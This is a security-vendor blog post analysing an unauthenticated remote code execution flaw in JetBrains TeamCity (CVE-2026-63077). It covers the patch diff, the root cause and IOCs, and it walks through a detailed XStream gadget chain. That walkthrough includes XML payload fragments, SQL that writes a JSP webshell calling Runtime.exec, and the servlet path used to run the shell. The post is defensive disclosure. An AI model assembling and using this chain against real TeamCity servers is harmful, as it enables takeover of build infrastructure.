---
schema_version: "1.0.0"
document_id: "69c566e90da551ab8501a104a76bc19debb180207ab0a897d8a706adf3c37b7b"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/ra-unauthenticated-rce-in-jetbrains-teamcity-cve-2026-63077"
published_at: "2026-08-07T14:32:47+00:00"
first_seen_at: "2026-08-07T17:19:39.935321+00:00"
fetched_at: "2026-08-07T17:19:41.217880+00:00"
content_hash: "sha256:2458765416244549c5f76893e7fd1e2933f3e0ea569aab844f8a371097ee44a4"
---

# Rapid7 Analysis: Unauthenticated Remote Code Execution in JetBrains TeamCity (CVE-2026-63077)

## Overview


On July 27, 2026, JetBrains published a


[security advisory](https://blog.jetbrains.com/teamcity/2026/07/cve-2026-63077/) for


[CVE-2026-63077](https://www.rapid7.com/db/vulnerabilities/cve-2026-63077/) , a critical unsafe deserialization vulnerability affecting JetBrains


[TeamCity](https://www.jetbrains.com/teamcity/) . An attacker who can reach a TeamCity server over HTTP or HTTPS can exploit the agent polling protocol without credentials and execute operating system commands with the privileges of the TeamCity server process.


JetBrains reported no known active exploitation when it disclosed the vulnerability. However, on August 5, 2026, CISA added CVE-2026-63077 to its


[Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-63077) (KEV) catalog, confirming exploitation in the wild.


Our analysis finds that a vulnerable TeamCity server creates a permissive XStream allowlist. This allowlist is intended to restrict which Java classes can be deserialized when servicing unauthenticated agent requests. However, this allowlist incorrectly adds TeamCity protocol classes without removing XStream's existing default permissions. This introduces an unsafe deserialization issue. A patched TeamCity server remediates this by adding


NoTypePermission.NONE


before the TeamCity allowlist, which removes the default permissions and makes the allowlist exclusive.


Rapid7 Labs has verified that the patch successfully remediates the exploit described in this analysis. A proof-of-concept script for CVE-2026-63077 can be found


[here](https://github.com/sfewer-r7/CVE-2026-63077) .


## Analysis


Our analysis compares a vulnerable TeamCity version


2026.1.2


against a patched version


2026.1.3


.


TeamCity uses a central server to coordinate builds and separate build agents to run them. An agent can communicate with the server through the agent polling protocol: it registers, asks the server for its next command, and reports whether that command succeeded or failed. The endpoints under


/app/agents/v1


support this agent communication channel rather than the TeamCity web interface or REST API. A


TeamCity-AgentSessionId


HTTP header value identifies a polling connection, but it does not mean that either a user or agent has authenticated to TeamCity, as access to many agent endpoints remains unauthenticated.


[XStream](https://x-stream.github.io/) is a Java library that converts object graphs to XML and reconstructs those graphs from XML. An


[object graph](https://x-stream.github.io/graphs.html) can contain nested objects, collection entries, private fields, and references to an object that appeared earlier in the document. XStream aliases give Java types shorter XML names. For example,


<linked-hash-map>


is XStream's alias for


java.util.LinkedHashMap


. Nested element names and


class


attributes select other concrete Java types, while reference attributes point back to objects that XStream has already constructed. Converters and reflection-based code then allocate the selected types and populate their fields.


### Patch diff


The class


jetbrains.buildServer.messages.XStreamHolder


is TeamCity's wrapper for creating and configuring XStream instances. TeamCity


2026.1.2


creates an instance of


XStreamHolder


, configures it, and then calls


setupSecurityIfNeeded()


. If the TeamCity allowlists contain entries, this method adds those entries to the permissions that XStream already installed:


```text
// ./webapps/ROOT/WEB-INF/lib/messages.jar
package jetbrains.buildServer.messages;


public class XStreamHolder {


// ...


private void setupSecurityIfNeeded(XStreamWrapper xStream) {
if (this.myAdditionalClassesWhiteList.isEmpty()
&& OUR_STATIC_CLASSES_WHITE_LIST.isEmpty()) {
XStreamHolder.setupDefaultSecurityOldWay(xStream);
return;
}
xStream.allowTypes(OUR_STATIC_CLASSES_WHITE_LIST.keySet()
.toArray(new String[0]));                         // <--- [1]
xStream.allowTypes(this.myAdditionalClassesWhiteList
.toArray(new String[0]));                         // <--- [2]
}
```


The calls at


\[1\]


and


\[2\]


do not start from an empty permission set. The bundled XStream


1.4.20.3


constructor has already called


setupSecurity()


, which permits several broad type hierarchies, including


Map


and


Throwable


:


```text
// ./webapps/ROOT/WEB-INF/lib/xstream.jar
package com.thoughtworks.xstream;


public class XStream {
// ...


protected void setupSecurity() {
if (this.securityMapper == null)
return;
addPermission(NoTypePermission.NONE);          // <--- Clears all existing permissions
addPermission(NullPermission.NULL);
addPermission(PrimitiveTypePermission.PRIMITIVES);
addPermission(ArrayTypePermission.ARRAYS);
addPermission(InterfaceTypePermission.INTERFACES);
allowTypeHierarchy(Calendar.class);
allowTypeHierarchy(Collection.class);
allowTypeHierarchy(Map.class);                 // <--- Map is allowed
allowTypeHierarchy(Map.Entry.class);
allowTypeHierarchy(Member.class);
allowTypeHierarchy(Number.class);
allowTypeHierarchy(Throwable.class);           // <--- Throwable is allowed
allowTypeHierarchy(TimeZone.class);
// ...
```


Therefore, even though TeamCity has not explicitly allowed any types, several allowed types are already present on the permission list due to XStream's defaults. This is enough to lead to unsafe deserialization.


The patch from version


2026.1.3


can be seen in the diff below and shows how these default allowed types are now cleared by TeamCity:


```text
+import com.thoughtworks.xstream.security.NoTypePermission;


+private static volatile boolean isWhiteListForced = true;


+public static void forceWhiteList(boolean force) {
+    isWhiteListForced = force;
+}


private void setupSecurityIfNeeded(XStreamWrapper xStream) {
if (this.myAdditionalClassesWhiteList.isEmpty()
&& OUR_STATIC_CLASSES_WHITE_LIST.isEmpty()) {
XStreamHolder.setupDefaultSecurityOldWay(xStream);
return;
}
+    if (isWhiteListForced) {
+        xStream.addPermission(NoTypePermission.NONE);    // <--- [3] Clears all existing permissions
+    }
xStream.allowTypes(OUR_STATIC_CLASSES_WHITE_LIST.keySet()
.toArray(new String[0]));
xStream.allowTypes(this.myAdditionalClassesWhiteList
.toArray(new String[0]));
}
```


The patched initializer turns the new behavior on before it populates the static allowlist:


```text
public static void initializeWhiteList() {
String string = TeamCityProperties.getProperty(
(String)"teamcity.xstream.additionalAllowedClassNames", (String)""
);
if ("*".equals(string)) {
return;
}
+    XStreamHolder.forceWhiteList((boolean)TeamCityProperties.getBooleanOrTrue(
+        (String)"teamcity.xstream.whiteList.forced"
+    ));                                                     // <--- [4]
XStreamHolder.addClassesWhiteList((String[])CLASSES_WHITE_LIST);
XStreamHolder.addClassesWhiteList((String[])string.split(","));
}
```


XStream's


SecurityMapper.addPermission()


clears its permission list when it receives


NoTypePermission.NONE


. The


allowTypes


calls that follow


\[3\]


now operate on a deny-by-default baseline, i.e.,


Map


and


Throwable


are no longer allowed types. The


TeamCityProperties.getBooleanOrTrue()


call at


\[4\]


means the new property defaults to


true


, so clearing the permission list at


\[3\]


will now occur by default on a patched server.


### Root cause


The missing XStream class type permission reset is the root cause of CVE-2026-63077. TeamCity treats the configured classes as an allowlist, but XStream evaluates them alongside its earlier default permissions. In Java, a type hierarchy permission covers implementations and subclasses, not only the named type. Permitting


Map


therefore covers classes that implement


Map


such as


LinkedHashMap


, while permitting


Throwable


covers exception subclasses such as


RuntimeException


. These broad permissions expose enough object construction and reconstruction callbacks to assemble a working gadget chain.


The exploit also depends on how XStream's reflection converter handles declared fields and object references. Java reflection lets code inspect a class's field definitions at runtime and assign values to an object's fields. An explicitly represented


class


name or


class


attribute passes through


SecurityMapper.realClass()


. By contrast, an exact declared field already provides its Java type, allowing XStream to allocate that field without a second explicit type lookup. An XPath reference can then reuse the allocated object without another type check when the reference omits the redundant concrete


class


attribute. In this context, XPath is an address within the XML object graph, not a query against TeamCity data.


Applied here, this allows a deserialization payload that begins with TeamCity's


HSQLMetadataStorage$SchemaMismatchException


. This class extends


RuntimeException


, so XStream accepts it under the default


Throwable


hierarchy permission. Because it is a non-static inner class, it has a compiler-generated field pointing to its enclosing


HSQLMetadataStorage


instance. From there, the exact declared fields


myHSQLStorage


and


myDataSource


lead XStream to an


org.apache.commons.dbcp2.BasicDataSource


. XStream follows those field types without resolving


BasicDataSource


from an explicit element name or


class


attribute, even though TeamCity


2026.1.2


rejects that class when the XML names it directly. The patched version


2026.1.3


stops the chain earlier by rejecting


SchemaMismatchException


, which is absent from TeamCity's explicit protocol allowlist.


### Triggering the vulnerability


First, the server accepts an agent registration request via an HTTP POST to the


/app/agents/v1/register


endpoint, and returns a new session identifier in the


TeamCity-AgentSessionId


response header.


The attacker then sends arbitrary XML to the error command endpoint with that server-issued session header via an HTTP POST to the


/app/agents/v1/commands/error


endpoint. The handler for this endpoint is the method


handleCommands


, shown below. This will validate the incoming request’s


TeamCity-AgentSessionId


header before calling the handler for the error command.


```text
// ./webapps/ROOT/WEB-INF/lib/web-core.jar
package jetbrains.buildServer.controllers.agentServer;
private ModelAndView handleCommands(
HttpServletRequest request,
HttpServletResponse response,
String[] path) throws Exception {
String sessionId = request.getHeader("TeamCity-AgentSessionId");
BuildAgentEx agent =
sessionId != null ? findAgentBySessionId(sessionId) : null; // <--- validate agent session ID
// This check occurs before the vulnerable handler is reached.
if (agent == null) {
response.setStatus(401);
response.getWriter().write("Agent's session is not found");
return null;
}
PollingRemoteAgentConnection connection =
(PollingRemoteAgentConnection) agent.getConnection();
if (path.length == 4) {
String operation = path[3];
if (operation.equals("error")) {
getCommandsProcessor().handleCommandIsFailedRequest(
connection, request, response
); // <--- call the error handler
}
}
return null;
}
```


The method


handleCommandIsFailedRequest


will then proceed to unsafely deserialize the incoming request’s XML body.


```text
// ./webapps/ROOT/WEB-INF/lib/web-core.jar
package jetbrains.buildServer.controllers.agentServer;


abstract class AbstractAgentCommandsRequestsProcessor implements AgentCommandsRequestsProcessor {
// ...


public void handleCommandIsFailedRequest(
PollingRemoteAgentConnection connection,
HttpServletRequest request,
HttpServletResponse response) throws IOException {
Error error = Error.fromXml(
StreamUtil.readTextFrom(request.getReader())
); // <--- deserialize attacker's XML


// ...
}
```


Error.fromXml()


calls


XStreamWrapper.deserializeObject()


. By providing a suitable gadget chain in the incoming request’s XML body, we can achieve unauthenticated RCE via unsafe deserialization.


### The gadget chain


The gadget chain's objective is to make TeamCity call


BasicDataSource.getConnection()


on an attacker-configured object. That getter starts the following path from deserialization to command execution:


1.


The payload reconstructs a


BasicDataSource


configured to use TeamCity's bundled HSQLDB driver.


2.


A collection callback causes FreeMarker to resolve the JavaBean property


connection


, which invokes


BasicDataSource.getConnection()


.


3.


Apache DBCP opens a new in-memory HSQLDB database and executes the SQL in


connectionInitSqls


.


4.


The final SQL statement uses HSQLDB's


SCRIPT


command to write a malicious JSPWS file into TeamCity's webroot.


5.


The attacker makes an HTTP request to that JSP file, executing the script's contents server-side, for example


Runtime.getRuntime().exec()


can be used to execute an attacker-controlled OS command.


The first four steps occur while TeamCity handles the malicious XML request. The fifth requires a second HTTP request. The object graph exists to solve two problems in the first two steps: XStream rejects


BasicDataSource


when the XML names it directly, and merely constructing a datasource does not call its


getConnection()


method.


#### Object graph construction


The payload's XML root is a three-entry


LinkedHashMap


. Entry one constructs and configures the datasource without naming its concrete class in a new XML node. Entry two presents that datasource to FreeMarker as an object whose properties can be read by name. Entry three forces a lookup of the property named


connection


.


*Figure 1: High-level gadget chain flow to*


BasicDataSource.getConnection()


*.*


The entries appear in this order in the XML because the later entries refer to objects created by the earlier ones. XStream reconstructs them in document order, and the


LinkedHashMap


retains their insertion order in the resulting Java object.


##### Entry one: construct and configure the datasource


The first entry begins with


HSQLMetadataStorage$SchemaMismatchException


. This class extends


RuntimeException


, so XStream accepts it under the default


Throwable


hierarchy permission. It is a non-static Java inner class, which means the compiler gives each instance a hidden


this$0


field pointing to its enclosing


HSQLMetadataStorage


object. XStream serializes that compiler-generated reference as


outer-class


.


The enclosing


HSQLMetadataStorage


declares a field named


myHSQLStorage


with the exact type


HSQLStorage


. That class, in turn, declares


myDataSource


with the exact type


BasicDataSource


. Because the XML does not represent either field with a new element type or


class


attribute, XStream follows the declared Java field types without performing another explicit lookup for those classes:


```text
<jetbrains.buildServer.serverSide.metadata.impl.metadata.HSQLMetadataStorage_-SchemaMismatchException>
<outer-class>
<myHSQLStorage>
<myDataSource>
<driverClassName>org.hsqldb.jdbc.JDBCDriver</driverClassName>
<url>jdbc:hsqldb:mem:&lt;random&gt;</url>
<userName>SA</userName>
<connectionInitSqls>
<!-- attacker-controlled HSQLDB statements -->
</connectionInitSqls>
</myDataSource>
</myHSQLStorage>
</outer-class>
</jetbrains.buildServer.serverSide.metadata.impl.metadata.HSQLMetadataStorage_-SchemaMismatchException>
```


XStream encodes the dollar sign in a Java inner-class name as


_-


when it creates an XML element name. The element ending in


HSQLMetadataStorage_-SchemaMismatchException


therefore identifies the Java class


HSQLMetadataStorage$SchemaMismatchException


.


##### Entry two: expose the datasource through FreeMarker


The first entry leaves a configured datasource in memory, but nothing has called it. The second entry makes its JavaBean properties available through a FreeMarker


HashAdapter


.


HashAdapter


extends


AbstractMap


, so XStream accepts the explicit class under its default


Map


hierarchy permission.


The adapter needs a FreeMarker model that can read properties from the datasource. The payload creates a


BooleanModel


through the exact


BeansWrapper.falseModel


field, then populates the model's inherited


BeanModel.object


field with a reference to the


BasicDataSource


in entry one instead of a Boolean value. Finally,


HashAdapter.model


refers to that


BooleanModel


:


```text
<freemarker.ext.beans.HashAdapter>
<wrapper>
<!-- Class-introspection state from the PoC is omitted here. -->
<falseModel>
<object reference="../../../../../entry/jetbrains.buildServer.serverSide.metadata.impl.metadata.HSQLMetadataStorage_-SchemaMismatchException/outer-class/myHSQLStorage/myDataSource"/>
<wrapper reference="../.."/>
<value>false</value>
</falseModel>
<!-- Remaining BeansWrapper state from the PoC is omitted here. -->
</wrapper>
<model reference="../wrapper/falseModel"/>
</freemarker.ext.beans.HashAdapter>
```


The reference attributes preserve object identity rather than create copies.


BooleanModel.object


points to the existing datasource,


HashAdapter.model


points to the existing


BooleanModel


, and


BooleanModel.wrapper


points back to the same


BeansWrapper


. No reference introduces a new concrete class node. In particular,


<object>


does not repeat the


BasicDataSource


type, so XStream does not perform a new explicit lookup for that denied class. The shared


BeansWrapper


supplies the class introspection used later to resolve the


connection


property.


##### Entry three: trigger the property lookup


The graph can now resolve datasource properties, but it still needs an automatic callback to request one. The third entry uses a


HashSet


, accepted under XStream's default


Collection


hierarchy permission, and a Commons Collections


TiedMapEntry


, accepted under the default


Map.Entry


hierarchy permission. A


TiedMapEntry


ties a key to a backing map. Here, its


map


field refers to the


HashAdapte


r


from entry two, and its key is the string


connection


:


```text
<set>
<org.apache.commons.collections.keyvalue.TiedMapEntry>
<map class="freemarker.ext.beans.HashAdapter"
reference="../../../../entry[2]/freemarker.ext.beans.HashAdapter"/>
<key class="string">connection</key>
</org.apache.commons.collections.keyvalue.TiedMapEntry>
</set>
```


The


reference


value is relative to the nested


<map>


element. Four


../


steps return to the


LinkedHashMap


root, and XPath's one-based


entry\[2\]


index selects the second entry. Reusing that adapter preserves its connection to the


BooleanModel


and, through the model, to the datasource from entry one.


Object construction now ends with one continuous route:


TiedMapEntry


to


HashAdapter


,


HashAdapter


to


BooleanModel


, and


BooleanModel


to


BasicDataSource


. At this point, no database connection has opened yet. The gadget chain triggers when XStream inserts the


TiedMapEntry


into the


HashSet


.


#### Triggering gadget execution


A


HashSet


stores elements by hash. When XStream inserts the reconstructed


TiedMapEntry


,


HashSet.add()


automatically calls


TiedMapEntry.hashCode()


. That method calls


getValue()


, which performs


map.get(key)


against the referenced


HashAdapter


with


connection


as the key. It is worth noting that this is a mechanism very similar to that used by the classic


[CommonsCollections6](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java) ysoserial gadget. However, the existing CommonsCollections6 gadget cannot be used because TeamCity’s XStream permissions reject the


ChainedTransformer


and


InvokerTransformer


classes used by CommonsCollections6.


The resulting call to


HashAdapter.get("connection")


passes the property name


connection


to the referenced


BooleanModel


.


BooleanModel


inherits FreeMarker's


BeanModel


property lookup. JavaBeans use a naming convention in which a property named


connection


can be read through a public


getConnection()


method, so FreeMarker invokes


BasicDataSource.getConnection()


.


A Java


DataSource


is a factory for Java Database Connectivity (JDBC) connections.


BasicDataSource


is the Apache Commons Database Connection Pooling (DBCP) implementation bundled with TeamCity. The payload configures it to load TeamCity's bundled HyperSQL Database (HSQLDB) driver and connect to a new in-memory database at a randomized


jdbc:hsqldb:mem:


URL. This database is separate from TeamCity's application database and requires no TeamCity database credentials. DBCP then runs the attacker-controlled


connectionInitSqls


, a list of SQL statements intended to initialize each new connection.


The initialization SQL creates a table containing a JSP scriptlet and asks HSQLDB to serialize the database to an attacker-selected path:


```text
CREATE TABLE IF NOT EXISTS T<RANDOM>(C<RANDOM> VARCHAR(4000))
INSERT INTO T<RANDOM> VALUES ('<% ... Runtime.getRuntime().exec(command) ... %>')
SCRIPT '../webapps/ROOT/<random-hex>.jspws'
```


HSQLDB's


SCRIPT


statement writes a textual representation of the in-memory database to the supplied path. The payload places a JavaServer Pages (JSP) scriptlet inside a table row, so the resulting SQL script is also a valid JSP template (i.e. a polyglot). This mechanism is similar to the one used by


[Secfault Security](https://secfault-security.com/blog/libreoffice.html) as part of a LibreOffice exploit.


### Executing a JSP payload


Apache Jasper is the JSP engine in TeamCity's servlet container. It compiles JSP source code into Java servlet code that handles an HTTP request, then runs that code inside the TeamCity server's Java process. Whether a path reaches Jasper depends on the servlet mappings in


WEB-INF/web.xml


. TeamCity defines


realJspServlet


as Jasper's


org.apache.jasper.servlet.JspServlet


, then maps the custom


*.jspws


extension directly to it. By contrast, TeamCity sends ordinary


*.jsp


requests to its


buildServer


dispatcher:


```text
<servlet>
<servlet-name>realJspServlet</servlet-name>
<servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
</servlet>


<servlet-mapping>
<servlet-name>realJspServlet</servlet-name>
<url-pattern>*.jspws</url-pattern>
</servlet-mapping>


<servlet-mapping>
<servlet-name>buildServer</servlet-name>
<url-pattern>*.jsp</url-pattern>
</servlet-mapping>
```


The


buildServer


servlet does not dispatch every direct


.jsp


request to Jasper. The corresponding


JspController.doHandle()


method first requires an internal TeamCity request, an authenticated TeamCity user, or an explicit configuration property that permits direct JSP requests. If these are not present, it returns HTTP 403 before the JSP runs:


```text
// web-core.jar!jetbrains.spring.web.JspController


public class JspController extends BaseController implements CustomUrlHandler {
protected ModelAndView doHandle(@NotNull HttpServletRequest httpServletRequest, @NotNull HttpServletResponse httpServletResponse) throws IOException, ServletException {
// ...
if (!RequestStackCalculationInterceptor.isInnerRequest(request)
&& SessionUser.getUser(request) == null
&& !TeamCityProperties.getBoolean(
"teamcity.jsp.directRequests.allowed"
)) {
response.setStatus(403);
response.getWriter().write("Access denied");
return null;
}
```


We therefore target


.jspws


, as this allows a direct anonymous request to reach Jasper, compile the newly written file and execute it. This allows us to execute arbitrary Java such as


Runtime.getRuntime().exec()


which in turn can deliver the payload.


## Exploitation


A proof-of-concept script for CVE-2026-63077 can be found


[here](https://github.com/sfewer-r7/CVE-2026-63077) . Organizations can use this script to validate their detection and remediation posture. The exploit script will leverage the gadget chain described in this analysis to write a malicious JSPWS file in order to execute an arbitrary command, before deleting the JSPWS file from disk. An example of its operation is shown below in Figure 2.


*Figure 2: Proof-of-concept exploitation.*


The vendor-supplied patch, version


2026.1.3


, has been verified to successfully prevent the unsafe deserialization of the gadget chain presented in this analysis. The


teamcity-server.log


file on a patched system shows the new XStream


NoTypePermission.NONE


added by the patch to effectively prevent the gadget chain's first entry,


HSQLMetadataStorage$SchemaMismatchException


, from having its type successfully resolved.


```text
[2026-08-07 01:53:09,794]  ERROR -   jetbrains.buildServer.SERVER - Error com.thoughtworks.xstream.security.ForbiddenClassException: jetbrains.buildServer.serverSide.metadata.impl.metadata.HSQLMetadataStorage$SchemaMismatchException; while processing request: POST '/app/agents/v1/commands/error', from client 192.168.86.70:58356, user-agent "Python-urllib/3.10", no auth


com.thoughtworks.xstream.security.ForbiddenClassException: jetbrains.buildServer.serverSide.metadata.impl.metadata.HSQLMetadataStorage$SchemaMismatchException
at com.thoughtworks.xstream.security.NoTypePermission.allows(NoTypePermission.java:26)
at com.thoughtworks.xstream.mapper.SecurityMapper.realClass(SecurityMapper.java:74)
at com.thoughtworks.xstream.mapper.MapperWrapper.realClass(MapperWrapper.java:125)
at com.thoughtworks.xstream.mapper.CachingMapper.realClass(CachingMapper.java:47)
...
```


## IOC


On an exploited system, the TeamCity server logs will contain detailed exception traces due to the deserialization gadget causing a Java exception to be thrown. For example, in the log file


C:\\TeamCity\\logs\\teamcity-server.log


the following may be present. This identifies the vulnerable URI path, the attacker's IP address, and an exception that correlates to the gadget chain being used for exploitation. Note: the full stack trace has been removed for brevity:


```text
[2026-08-07 00:36:36,467]  ERROR -   jetbrains.buildServer.SERVER - Error com.thoughtworks.xstream.converters.ConversionException:
---- Debugging information ----
cause-exception     : freemarker.template.utility.UndeclaredThrowableException
cause-message       : freemarker.core._TemplateModelException: An error has occurred when reading existing sub-variable "connection"; see cause exception! The type of the containing value was: boolean+extended_hash (org.apache.commons.dbcp2.BasicDataSource wrapped into f.e.b.BooleanModel)
class               : java.util.HashSet
required-type       : java.util.HashSet
converter-type      : com.thoughtworks.xstream.converters.collections.CollectionConverter
path                : /linked-hash-map/entry[3]/set/org.apache.commons.collections.keyvalue.TiedMapEntry
line number         : 104
class[1]            : java.util.LinkedHashMap
required-type[1]    : java.util.LinkedHashMap
converter-type[1]   : com.thoughtworks.xstream.converters.collections.MapConverter
version             : 2026.1-222647
-------------------------------; while processing request: POST '/app/agents/v1/commands/error', from client 192.168.86.70:52728, user-agent "Python-urllib/3.10", no auth


com.thoughtworks.xstream.converters.ConversionException:
---- Debugging information ----
cause-exception     : freemarker.template.utility.UndeclaredThrowableException
class               : java.util.HashSet
required-type       : java.util.HashSet
line number         : 104
class[1]            : java.util.LinkedHashMap
required-type[1]    : java.util.LinkedHashMap
version             : 2026.1-222647
-------------------------------
at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:81)
at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(AbstractReferenceUnmarshaller.java:72)
...
```


A similar exception in a


javaLogging


file (for example,


C:\\TeamCity\\logs\\teamcity-javaLogging-2026-08-07.log


) will also show the gadget chain’s JSPWS payload as part of an


org.hsqldb.HsqlException


message:


```text
07-Aug-2026 00:36:36.462 SEVERE [http-nio-8111-exec-4] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [buildServer] in context with path [] threw exception [Request processing failed; nested exception is com.thoughtworks.xstream.converters.ConversionException:
---- Debugging information ----
cause-exception     : freemarker.template.utility.UndeclaredThrowableException
cause-message       : freemarker.core._TemplateModelException: An error has occurred when reading existing sub-variable "connection"; see cause exception! The type of the containing value was: boolean+extended_hash (org.apache.commons.dbcp2.BasicDataSource wrapped into f.e.b.BooleanModel)
class               : java.util.HashSet
required-type       : java.util.HashSet
converter-type      : com.thoughtworks.xstream.converters.collections.CollectionConverter
path                : /linked-hash-map/entry[3]/set/org.apache.commons.collections.keyvalue.TiedMapEntry
line number         : 104
class[1]            : java.util.LinkedHashMap
required-type[1]    : java.util.LinkedHashMap
converter-type[1]   : com.thoughtworks.xstream.converters.collections.MapConverter
version             : 2026.1-222647
-------------------------------] with root cause
org.hsqldb.HsqlException: file input/output error: ../webapps/ROOT/682aed03b49b.jspws already exists
at org.hsqldb.error.Error.error(Unknown Source)
...
```


## Remediation


For remediation guidance, please see Rapid7’s Emergent Threat Response


[blog](https://www.rapid7.com/blog/post/etr-cve-2026-63077-critical-unauthenticated-remote-code-execution-in-jetbrains-teamcity/) for CVE-2026-63077, which contains further details.
